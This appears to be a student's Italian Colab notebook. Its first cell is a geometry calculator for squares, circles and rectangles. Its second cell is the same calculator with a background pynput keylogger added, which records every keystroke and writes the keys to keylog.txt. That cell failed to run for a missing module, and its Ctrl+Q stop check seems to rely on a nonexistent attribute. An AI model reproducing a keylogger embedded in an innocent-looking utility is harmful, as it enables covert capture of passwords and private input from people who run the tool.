{"nbformat":4,"nbformat_minor":0,"metadata":{"colab":{"provenance":[],"authorship_tag":"ABX9TyNYesapGUSb47TlTmckSq/3"},"kernelspec":{"name":"python3","display_name":"Python 3"},"language_info":{"name":"python"}},"cells":[{"cell_type":"code","execution_count":1,"metadata":{"colab":{"base_uri":"https://localhost:8080/"},"id":"0ifzGkDDwcEB","executionInfo":{"status":"ok","timestamp":1743752676288,"user_tz":-120,"elapsed":15269,"user":{"displayName":"Mattia Carlesso","userId":"05735829429137259989"}},"outputId":"2a19b436-abbb-456a-f9b4-0855c96ba270"},"outputs":[{"output_type":"stream","name":"stdout","text":["Inserisci il valore iniziale: 20\n","\n","Figure disponibili:\n","1. quadrato\n","2. cerchio\n","3. rettangolo\n","Seleziona una figura: 1\n","\n","Perimetro quadrato: 80.00\n","Area quadrato: 400.00\n","\n","Figure disponibili:\n","1. cerchio\n","2. rettangolo\n","Seleziona una figura: 1\n","\n","Perimetro cerchio: 2513.27\n","Area cerchio: 502654.82\n","\n","Figure disponibili:\n","1. rettangolo\n","Seleziona una figura: 1\n","\n","Perimetro rettangolo: 1005311.65\n","Area rettangolo: 502654.82\n"]}],"source":["import math\n","\n","def main():\n","    valore_corrente = float(input(\"Inserisci il valore iniziale: \"))\n","    figure_disponibili = ['quadrato', 'cerchio', 'rettangolo']\n","\n","    for _ in range(3):\n","        print(\"\\nFigure disponibili:\")\n","        for i, figura in enumerate(figure_disponibili, 1):\n","            print(f\"{i}. {figura}\")\n","\n","        scelta = int(input(\"Seleziona una figura: \")) - 1\n","        figura_scelta = figure_disponibili.pop(scelta)\n","\n","        if figura_scelta == 'quadrato':\n","            perimetro = 4 * valore_corrente\n","            area = valore_corrente ** 2\n","        elif figura_scelta == 'cerchio':\n","            perimetro = 2 * math.pi * valore_corrente\n","            area = math.pi * (valore_corrente ** 2)\n","        elif figura_scelta == 'rettangolo':\n","            perimetro = 2 * (valore_corrente + 1)  # base = valore_corrente, altezza = 1\n","            area = valore_corrente * 1\n","\n","        print(f\"\\nPerimetro {figura_scelta}: {perimetro:.2f}\")\n","        print(f\"Area {figura_scelta}: {area:.2f}\")\n","        valore_corrente = area\n","\n","if __name__ == \"__main__\":\n","    main()"]},{"cell_type":"code","source":["import math\n","from pynput import keyboard\n","import threading\n","import sys\n","\n","log = []\n","stop_program = False\n","\n","def on_press(key):\n","    global stop_program\n","    log.append(key)\n","\n","    # Combinazione per fermare il programma: Ctrl + Q\n","    if key == keyboard.KeyCode.from_char('q') and any([k in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r] for k in keyboard._current_keys]):\n","        print(\"\\nCombinazione di arrestio rilevata!\")\n","        stop_program = True\n","        return False\n","\n","def keylogger():\n","    with keyboard.Listener(on_press=on_press) as listener:\n","        listener.join()\n","\n","def main():\n","    global stop_program\n","\n","    # Avvia il keylogger in background\n","    logger_thread = threading.Thread(target=keylogger, daemon=True)\n","    logger_thread.start()\n","\n","    try:\n","        valore_corrente = float(input(\"Inserisci il valore iniziale: \"))\n","        figure_disponibili = ['quadrato', 'cerchio', 'rettangolo']\n","\n","        for _ in range(3):\n","            if stop_program:\n","                break\n","\n","            print(\"\\nFigure disponibili:\")\n","            for i, figura in enumerate(figure_disponibili, 1):\n","                print(f\"{i}. {figura}\")\n","\n","            try:\n","                scelta = int(input(\"Seleziona una figura: \")) - 1\n","            except:\n","                print(\"Input non valido!\")\n","                continue\n","\n","            if scelta < 0 or scelta >= len(figure_disponibili):\n","                print(\"Selezione non valida!\")\n","                continue\n","\n","            figura_scelta = figure_disponibili.pop(scelta)\n","\n","            if figura_scelta == 'quadrato':\n","                perimetro = 4 * valore_corrente\n","                area = valore_corrente ** 2\n","            elif figura_scelta == 'cerchio':\n","                perimetro = 2 * math.pi * valore_corrente\n","                area = math.pi * (valore_corrente ** 2)\n","            elif figura_scelta == 'rettangolo':\n","                perimetro = 2 * (valore_corrente + 1)\n","                area = valore_corrente * 1\n","\n","            print(f\"\\nPerimetro {figura_scelta}: {perimetro:.2f}\")\n","            print(f\"Area {figura_scelta}: {area:.2f}\")\n","            valore_corrente = area\n","\n","    finally:\n","        # Salva il log e stampa\n","        with open(\"keylog.txt\", \"w\") as f:\n","            for tasto in log:\n","                f.write(f\"{tasto}\\n\")\n","\n","        print(\"\\nLog tastiera salvato in keylog.txt\")\n","        sys.exit(0)\n","\n","if __name__ == \"__main__\":\n","    main()"],"metadata":{"colab":{"base_uri":"https://localhost:8080/","height":383},"id":"yFRxY_P4wecH","executionInfo":{"status":"error","timestamp":1743753685411,"user_tz":-120,"elapsed":158,"user":{"displayName":"Mattia Carlesso","userId":"05735829429137259989"}},"outputId":"13f8bb58-fd9c-4724-874c-5144059f7b9c"},"execution_count":2,"outputs":[{"output_type":"error","ename":"ModuleNotFoundError","evalue":"No module named 'pynput'","traceback":["\u001b[0;31m---------------------------------------------------------------------------\u001b[0m","\u001b[0;31mModuleNotFoundError\u001b[0m                       Traceback (most recent call last)","\u001b[0;32m<ipython-input-2-b6220c572742>\u001b[0m in \u001b[0;36m<cell line: 0>\u001b[0;34m()\u001b[0m\n\u001b[1;32m      1\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mmath\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 2\u001b[0;31m \u001b[0;32mfrom\u001b[0m \u001b[0mpynput\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mkeyboard\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      3\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mthreading\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      4\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0msys\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      5\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n","\u001b[0;31mModuleNotFoundError\u001b[0m: No module named 'pynput'","","\u001b[0;31m---------------------------------------------------------------------------\u001b[0;32m\nNOTE: If your import is failing due to a missing package, you can\nmanually install dependencies using either !pip or !apt.\n\nTo view examples of installing some common dependencies, click the\n\"Open Examples\" button below.\n\u001b[0;31m---------------------------------------------------------------------------\u001b[0m\n"],"errorDetails":{"actions":[{"action":"open_url","actionText":"Open Examples","url":"/notebooks/snippets/importing_libraries.ipynb"}]}}]},{"cell_type":"code","source":[],"metadata":{"id":"DbW_iDmZ0agw"},"execution_count":null,"outputs":[]}]}